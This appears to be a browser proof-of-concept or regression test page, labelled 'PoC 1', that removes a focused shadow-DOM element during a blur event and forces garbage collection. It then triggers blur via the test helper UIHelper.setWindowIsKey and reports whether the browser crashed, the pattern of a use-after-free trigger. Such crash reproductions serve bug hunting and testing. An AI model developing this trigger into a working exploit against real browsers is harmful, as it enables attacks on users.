<!DOCTYPE html>
<html>
<body>
<p>PoC 1 - setWindowIsKey(false)</p>
<div id="host"></div>
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable';
shadowRoot.appendChild(victim);
victim.focus();

document.addEventListener('blur', () => {
    victim.remove();
    victim = null;
    gc();
}, true);

async function run() {
    if (window.UIHelper && UIHelper.setWindowIsKey) {
        await UIHelper.setWindowIsKey(false);
    } else {
        result.textContent = 'UIHelper.setWindowIsKey não disponível';
        return;
    }
    await new Promise(r => requestAnimationFrame(() => setTimeout(r, 0)));
    result.textContent = 'PASS (não crashou)';
}
run();
</script>
</body>
</html>
